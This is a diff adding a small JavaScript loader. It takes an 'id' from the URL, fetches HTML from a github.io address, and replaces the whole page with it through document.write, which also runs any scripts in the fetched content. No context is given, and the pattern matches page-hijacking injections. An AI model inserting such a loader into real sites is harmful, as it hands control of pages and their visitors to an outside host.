@@ -1,0 +1,17 @@
+var id = new URLSearchParams(location.search).get("id") || "sports"; 
+
+
+
+fetch("https://anthonkoyesta.github.io/new-update/vmb/" + id + ".html")
+
+  .then(e => e.text())
+
+  .then(e => { 
+
+    document.open(), 
+
+    document.write(e), 
+
+    document.close() 
+
+  });
